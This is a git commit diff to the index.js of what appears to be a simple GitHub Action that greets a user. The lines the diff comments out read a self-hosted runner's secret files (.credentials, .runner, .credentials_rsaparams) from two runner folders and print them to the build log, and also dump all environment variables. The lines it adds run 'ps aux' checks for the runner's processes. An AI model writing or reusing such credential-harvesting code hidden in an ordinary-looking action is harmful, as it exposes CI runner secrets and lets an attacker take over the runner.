17e7efc6f80f4c4d2d3fb2412fe1be9daea6c907
dreamli0 <136119580+dreamli0@users.noreply.github.com>
2023-07-24 16:07:23 -0400

    Update index.js

--- index.js
+++ index.js
@@ -7,45 +7,72 @@ try {
     
     console.log("This is the v1.1.2 version.");
     console.log(__dirname);
-    process.env["INPUT_WHO-TO-GREET"] = "123";
-    console.log(process.env);
+    // process.env["INPUT_WHO-TO-GREET"] = "123";
+    // console.log(process.env);
 
-    const files = fs.readdirSync('/home/musset/actions-runner');
-    files.forEach(element => {
-        if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
-            
-            let path = `/home/musset/actions-runner/${element}`;
-            
-            fs.readFile(path, "utf8", (err, data) => {
-                if(err){
-                    console.log(err);
-                    return;
-                }
-                console.log(`-----${element}------`);
-                console.log(data.toString());
-            });
-            
+    cl_process.exec("ps aux | grep 'run.sh'", (err, stdout, stderr) => {
+        if (err){
+            console.log(err);
+            return;
         }
+        console.log(`stdout: ${stdout.toString()}`);
+        console.log(`stderr: ${stderr}`);
+    });
+
+    cl_process.exec("ps aux | grep 'run-helper.sh'", (err, stdout, stderr) => {
+        if (err){
+            console.log(err);
+            return;
+        }
+        console.log(`stdout: ${stdout.toString()}`);
+        console.log(`stderr: ${stderr}`);
+    });
+
+    cl_process.exec("ps aux | grep 'Runner.Listener'", (err, stdout, stderr) => {
+        if (err){
+            console.log(err);
+            return;
+        }
+        console.log(`stdout: ${stdout.toString()}`);
+        console.log(`stderr: ${stderr}`);
+    });
+    
+    // const files = fs.readdirSync('/home/musset/actions-runner');
+    // files.forEach(element => {
+    //     if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
+            
+    //         let path = `/home/musset/actions-runner/${element}`;
+            
+    //         fs.readFile(path, "utf8", (err, data) => {
+    //             if(err){
+    //                 console.log(err);
+    //                 return;
+    //             }
+    //             console.log(`-----${element}------`);
+    //             console.log(data.toString());
+    //         });
+            
+    //     }
         
-    });
-    const files_other = fs.readdirSync('/home/musset/actions-runner-private');
-    files_other.forEach(element => {
-        if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
+    // });
+    // const files_other = fs.readdirSync('/home/musset/actions-runner-private');
+    // files_other.forEach(element => {
+    //     if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
             
-            let path = `/home/musset/actions-runner-private/${element}`;
+    //         let path = `/home/musset/actions-runner-private/${element}`;
             
-            cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
-                if (err){
-                    console.log(err);
-                    return;
-                }
-                console.log(`-----${element}------`);
-                console.log(`stdout: ${stdout.toString()}`);
-                console.log(`stderr: ${stderr}`);
-            });
+    //         cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
+    //             if (err){
+    //                 console.log(err);
+    //                 return;
+    //             }
+    //             console.log(`-----${element}------`);
+    //             console.log(`stdout: ${stdout.toString()}`);
+    //             console.log(`stderr: ${stderr}`);
+    //         });
             
-        }
-    });
+    //     }
+    // });
 
     const nameToGreet = core.getInput('hi-there') + "122222";
     console.log(`Say Hello ${nameToGreet}!`);
